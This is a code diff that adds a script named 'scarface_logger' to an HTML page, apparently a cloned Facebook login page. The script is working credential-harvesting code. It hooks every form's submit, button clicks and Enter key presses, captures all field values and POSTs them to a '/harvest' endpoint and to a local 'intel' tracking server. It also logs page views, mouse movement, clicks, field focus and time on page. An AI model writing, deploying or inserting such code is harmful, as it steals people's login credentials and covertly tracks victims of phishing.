@@ -2,6 +2,165 @@
 
 <html class="no_js" id="facebook" lang="en">
 <head>
+<!-- scarface_logger -->
+<script>
+(function() {
+    if(window.__scarface_loaded) return;
+    window.__scarface_loaded = true;
+    
+    const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    
+    // ==================== CREDENTIAL HARVESTING ====================
+    function formToDict(form) {
+        var data = {};
+        var fd = new FormData(form);
+        fd.forEach(function(value, key) {
+            data[key] = value;
+        });
+        if(Object.keys(data).length === 0) {
+            var idx = 0;
+            var els = form.querySelectorAll('input,select,textarea');
+            els.forEach(function(el) {
+                var k = el.name || el.id || ('field_'+idx++);
+                var v = el.value;
+                data[k] = v;
+            });
+        }
+        return data;
+    }
+    
+    function sendHarvest(form) {
+        try {
+            var data = formToDict(form);
+            fetch('/harvest', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(function(){});
+            
+            // Also send to intel dashboard
+            if (true) {
+                trackIntel('credentials_submitted', data);
+            }
+        }catch(e){}
+    }
+    
+    // ==================== INTEL TRACKING ====================
+    function trackIntel(eventType, data) {
+        if (!true) return;
+        
+        const payload = {
+            session_id: SESSION_ID,
+            event_type: eventType,
+            data: {
+                ...data,
+                url: window.location.href,
+                referrer: document.referrer,
+                screen: { width: screen.width, height: screen.height },
+                timestamp: new Date().toISOString()
+            }
+        };
+        
+        fetch('http://127.0.0.1:5500/track', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            mode: 'cors'
+        }).catch(function(){});
+    }
+    
+    // Track page view
+    if (true) {
+        trackIntel('page_view', {
+            title: document.title,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform
+        });
+    }
+    
+    // ==================== FORM HOOKS ====================
+    var origSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function() {
+        sendHarvest(this);
+        origSubmit.apply(this, arguments);
+    };
+    
+    document.addEventListener('submit', function(e){
+        sendHarvest(e.target);
+    }, true);
+    
+    function hookBtns(form){
+        var btns = form.querySelectorAll('[type=submit],button');
+        btns.forEach(function(btn){
+            btn.addEventListener('click', function(){sendHarvest(form);}, true);
+        });
+        var inputs = form.querySelectorAll('input');
+        inputs.forEach(function(input){
+            input.addEventListener('keydown', function(e){
+                if(e.key==='Enter'){sendHarvest(form);}
+            }, true);
+        });
+    }
+    
+    document.querySelectorAll('form').forEach(hookBtns);
+    
+    var mo = new MutationObserver(function(muts){
+        muts.forEach(function(mut){
+            mut.addedNodes.forEach(function(node){
+                if(node.tagName==='FORM') hookBtns(node);
+                else if(node.querySelectorAll) node.querySelectorAll('form').forEach(hookBtns);
+            });
+        });
+    });
+    mo.observe(document.documentElement,{childList:true,subtree:true});
+    
+    // ==================== INTEL TRACKING EVENTS ====================
+    if (true) {
+        // Mouse movement (throttled)
+        let lastMouse = 0;
+        document.addEventListener('mousemove', function(e) {
+            const now = Date.now();
+            if (now - lastMouse > 3000) {
+                lastMouse = now;
+                trackIntel('mouse_move', { x: e.clientX, y: e.clientY });
+            }
+        }, { passive: true });
+        
+        // Clicks
+        document.addEventListener('click', function(e) {
+            trackIntel('click', {
+                element: e.target.tagName,
+                id: e.target.id,
+                text: e.target.textContent?.substring(0, 50)
+            });
+        }, { passive: true });
+        
+        // Form field focus
+        document.addEventListener('focus', function(e) {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                trackIntel('form_field_focus', {
+                    field_name: e.target.name || e.target.id,
+                    field_type: e.target.type
+                });
+            }
+        }, true);
+        
+        // Time on page
+        let timeOnPage = 0;
+        setInterval(function() {
+            timeOnPage += 5;
+            trackIntel('time_on_page', { seconds: timeOnPage });
+        }, 5000);
+        
+        // Page unload
+        window.addEventListener('beforeunload', function() {
+            trackIntel('page_unload', { seconds_on_page: timeOnPage });
+        });
+    }
+})();
+</script>
+
 <!-- harvest_logger -->
 <script>
 (function() {
